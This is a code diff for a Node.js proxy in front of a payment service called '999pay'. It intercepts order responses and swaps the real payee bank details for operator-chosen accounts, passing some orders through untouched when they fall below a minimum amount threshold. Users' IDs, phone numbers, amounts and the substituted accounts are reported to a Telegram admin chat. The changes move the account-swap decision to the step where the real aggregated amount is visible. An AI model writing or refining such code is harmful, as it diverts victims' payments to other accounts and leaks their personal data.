@@ -1584,7 +1584,6 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 
     const detectedUserId = reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
-    const active = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;
 
     const respData = getResponseData(jsonResp);
 
@@ -1598,6 +1597,38 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       rd.buyOrderNo, rd.orderNo, rd.orderId, rd.buyOrderId, rd.id, orderBankLookupId
     ].filter(Boolean);
     const orderId = allOrderIds[0] || 'N/A';
+
+    // 🔑 Detect REAL aggregated amount from response (not request body).
+    // 999pay aggregates user's selected sell-orders → actual amount only appears here.
+    const detectedAmount = parseFloat(
+      rd.amount ?? rd.orderAmount ?? rd.buyAmount ?? rd.payAmount ?? rd.totalAmount ?? rd.payAmt ?? '0'
+    ) || 0;
+
+    // If /buy/order deferred the decision (no orderBankMap entry yet), make the
+    // call NOW using the freshly-detected amount, then proceed with replacement.
+    let lateDecisionLog = null;
+    if (eff.botEnabled !== false && detectedAmount > 0 && !hasOrderBankEntry(data, orderId)) {
+      const lateActive = getActiveBank(data, detectedUserId, detectedAmount);
+      if (lateActive) {
+        await saveOrderBankMultipleKeys(data, allOrderIds, lateActive);
+        lateDecisionLog = `🔗 Late bank decision (amount detected at /details): ₹${detectedAmount} → ${lateActive.accountHolder} | ${lateActive.accountNo}`;
+      } else if (data.banks && data.banks.length > 0) {
+        await markOrderBankSkip(data, orderId);
+        let reason;
+        if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
+          const ab = data.banks[data.activeIndex];
+          const abMin = Number(ab.minAmount) || 0;
+          reason = abMin > detectedAmount
+            ? `active bank #${data.activeIndex + 1} requires ≥ ₹${abMin}`
+            : `no bank qualifies for ₹${detectedAmount}`;
+        } else {
+          reason = `no bank qualifies for ₹${detectedAmount}`;
+        }
+        lateDecisionLog = `⏭️ Late skip (amount detected at /details): ₹${detectedAmount} — ${reason} → REAL bank shown`;
+      }
+    }
+
+    const active = eff.botEnabled !== false ? getActiveBank(data, detectedUserId, detectedAmount > 0 ? detectedAmount : undefined) : null;
 
     if (respData) {
       const savedBank = getOrderBankMultiple(data, allOrderIds);
@@ -1627,10 +1658,9 @@ async function proxyAndReplaceBankDetails(req, res, label) {
     sendJson(res, respHeaders, jsonResp, respBody);
 
     if (data.adminChatId && bot && !isLogOff(data, detectedUserId)) {
-      const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
+      const amount = detectedAmount > 0 ? detectedAmount : (rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A');
       const phone = getPhone(data, detectedUserId);
       const savedBank = getOrderBankMultiple(data, allOrderIds);
-      // Detect skip-marker: order was intentionally left as real upstream bank (below threshold)
       let isRealPassthrough = false;
       for (const oid of allOrderIds) {
         if (oid && data.orderBankMap && data.orderBankMap[String(oid)] && data.orderBankMap[String(oid)]._skip) {
@@ -1649,7 +1679,7 @@ async function proxyAndReplaceBankDetails(req, res, label) {
 📋 Order: ${orderId}
 💰 Amount: ₹${amount}
 💳 Bank: ${bankUsed ? `${bankUsed.accountHolder} | ${bankUsed.accountNo}` : (isRealPassthrough ? 'REAL upstream' : 'N/A')}
-${sourceLine}
+${sourceLine}${lateDecisionLog ? '\n' + lateDecisionLog : ''}
 🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       ).catch(()=>{});
     }
@@ -1910,6 +1940,8 @@ app.post('/app/buy/order', async (req, res) => {
   ]);
   try {
     const { response, respBody, respHeaders, jsonResp } = proxyResult;
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
     const buyData = getResponseData(jsonResp);
     const body = req.parsedBody || {};
     let newOrderId = '';
@@ -1918,59 +1950,26 @@ app.post('/app/buy/order', async (req, res) => {
     } else if (buyData && typeof buyData === 'object') {
       newOrderId = buyData.buyOrderNo || buyData.orderNo || buyData.orderId || buyData.buyOrderId || buyData.id || '';
     }
-
-    // FAST PATH: choose bank synchronously (no Redis write yet) and stamp it into
-    // in-memory cachedData so the *very next* details-lookup hits memory. Then
-    // ship the response to the user immediately. All Redis persistence and
-    // Telegram logging happen in a fire-and-forget tail below.
-    let chosenBank = null;
-    let skipMark = false;
-    let orderAmt = 0;
-    let userId = '';
-    try { userId = await extractUserId(req, jsonResp); } catch(_) {}
     if (newOrderId) {
       const eff = getEffectiveSettings(data, userId);
-      orderAmt = parseFloat(body.amount || body.buyAmount || body.orderAmount || '0') || 0;
-      if (eff.botEnabled !== false) {
-        chosenBank = getActiveBank(data, userId, orderAmt); // pure function, no Redis
-        if (chosenBank) {
-          // Stamp in-memory immediately so a racing details/processOrderNo call sees it.
-          if (!data.orderBankMap) data.orderBankMap = {};
-          data.orderBankMap[String(newOrderId)] = {
-            accountHolder: chosenBank.accountHolder,
-            accountNo: chosenBank.accountNo,
-            ifsc: chosenBank.ifsc,
-            bankName: chosenBank.bankName || '',
-            upiId: chosenBank.upiId || ''
-          };
+      const rawAmt = body.amount || body.buyAmount || body.orderAmount || body.payAmount || body.totalAmount || '';
+      const orderAmt = parseFloat(rawAmt) || 0;
+      // CRITICAL: 999pay aggregates user's selected sell-orders into ONE buy order.
+      // The actual aggregated amount is NOT in the request body — it only appears
+      // in the /details or /processOrderNo response. So:
+      //   • If we KNOW the amount (rare), decide bank now.
+      //   • If amount unknown (common), DO NOT pre-mark skip. Let /details decide
+      //     using the real amount from upstream response.
+      if (eff.botEnabled !== false && orderAmt > 0) {
+        const active = await getActiveBankAndSave(data, userId, orderAmt);
+        if (active) {
+          saveOrderBank(data, newOrderId, active);
+          if (data.adminChatId && bot) {
+            bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💰 Amount: ₹${orderAmt}\n💳 ${active.accountHolder} | ${active.accountNo}${(Number(active.minAmount)||0) > 0 ? ' (min ₹' + Number(active.minAmount) + ')' : ''}`).catch(()=>{});
+          }
         } else if (data.banks && data.banks.length > 0) {
-          if (!data.orderBankMap) data.orderBankMap = {};
-          data.orderBankMap[String(newOrderId)] = { _skip: true, t: Date.now() };
-          skipMark = true;
-        }
-      }
-    }
-
-    // 🚀 RESPOND TO USER NOW — no waiting on Redis or Telegram
-    sendJson(res, respHeaders, jsonResp, respBody);
-
-    // ── tail: persist + log, all fire-and-forget ──
-    setImmediate(() => {
-      try {
-        if (userId) trackUser(data, userId, 'Buy Order');
-        // Persist orderBankMap update + tracking in a single Redis write
-        saveData(data).catch(()=>{});
-        // If autoRotate consumed an index, getActiveBankAndSave's bookkeeping
-        // is already reflected in data._rotatedIndex; finalize it here.
-        if (data.autoRotate && data._rotatedIndex !== undefined) {
-          data.lastUsedIndex = data._rotatedIndex;
-          delete data._rotatedIndex;
-        }
-
-        if (data.adminChatId && bot) {
-          if (chosenBank) {
-            bot.sendMessage(data.adminChatId, `🔗 Bank saved for Order: ${newOrderId}\n💰 Amount: ₹${orderAmt}\n💳 ${chosenBank.accountHolder} | ${chosenBank.accountNo}${(Number(chosenBank.minAmount)||0) > 0 ? ' (min ₹' + Number(chosenBank.minAmount) + ')' : ''}`).catch(()=>{});
-          } else if (skipMark) {
+          await markOrderBankSkip(data, newOrderId);
+          if (data.adminChatId && bot) {
             let reason;
             if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) {
               const ab = data.banks[data.activeIndex];
@@ -1983,11 +1982,17 @@ app.post('/app/buy/order', async (req, res) => {
             }
             bot.sendMessage(data.adminChatId, `⏭️ Order ${newOrderId} amount ₹${orderAmt} — ${reason} → REAL bank will be shown`).catch(()=>{});
           }
-          const phone = getPhone(data, userId);
-          bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
         }
-      } catch(_) { /* tail must never throw */ }
-    });
+      } else if (eff.botEnabled !== false && data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `⏳ Order ${newOrderId} created — amount unknown in request body, deferring bank decision to /details (real amount will be detected there)`).catch(()=>{});
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+
+    if (data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      bot.sendMessage(data.adminChatId, `⚠️ Buy Order Created\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+    }
   } catch(e) {
     if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `❌ Buy Order ERROR: ${e.message}`).catch(()=>{});
@@ -2066,21 +2071,13 @@ app.all('/app/buy/order/processOrderNo', async (req, res) => {
     const eff = getEffectiveSettings(data, detectedUserId);
     const respData = getResponseData(jsonResp);
 
+    // Amount is NOT available on this endpoint. Defer the bank-decision to
+    // /app/buy/order/details where the REAL aggregated amount appears in the
+    // response. Don't pre-pick or pre-skip here — that would lock in a wrong
+    // decision before we know the amount.
     if (typeof respData === 'string' && respData.length > 5 && eff.botEnabled !== false) {
-      // Respect prior decision from /app/buy/order (real-bank skip OR saved bank)
-      if (!hasOrderBankEntry(data, respData)) {
-        // Order amount is NOT available on this endpoint. Be conservative:
-        // Only pick a bank that has no minAmount threshold (minAmount=0). If every
-        // bank has a threshold, leave map empty so real upstream bank passes through.
-        const active = getActiveBank(data, detectedUserId, 0);
-        if (active) {
-          saveOrderBank(data, respData, active);
-          if (data.adminChatId && bot) {
-            bot.sendMessage(data.adminChatId, `🔗 processOrderNo: Bank saved for ${respData}\n💳 ${active.accountHolder} | ${active.accountNo}`).catch(()=>{});
-          }
-        } else if (data.adminChatId && bot && data.banks && data.banks.length > 0) {
-          bot.sendMessage(data.adminChatId, `⏭️ processOrderNo: Order ${respData} — no threshold-free bank available & amount unknown → REAL bank passthrough`).catch(()=>{});
-        }
+      if (!hasOrderBankEntry(data, respData) && data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `⏳ processOrderNo: ${respData} — deferring bank decision to /details (real amount needed)`).catch(()=>{});
       }
     }
 
